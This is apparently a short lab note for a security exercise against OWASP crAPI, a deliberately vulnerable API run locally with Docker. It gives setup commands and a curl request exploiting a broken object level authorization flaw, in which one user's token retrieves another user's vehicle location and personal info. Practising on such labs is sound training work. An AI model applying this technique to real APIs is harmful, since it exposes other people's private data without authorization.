# Task 4 — crAPI BOLA Exploit Commands

## Setup
git clone https://github.com/OWASP/crAPI.git
docker compose -f deploy/docker/docker-compose.yml up -d

## Exploit
curl -s -i "http://localhost:8888/identity/api/v2/vehicle/8d5a7b43-a23f-4d82-987a-51f624b56cfd/location" \
  -H "Authorization: Bearer <userB_token>" \
  -H "Content-Type: application/json"

## Result: 200 OK, leaked userA's vehicle location + personal info
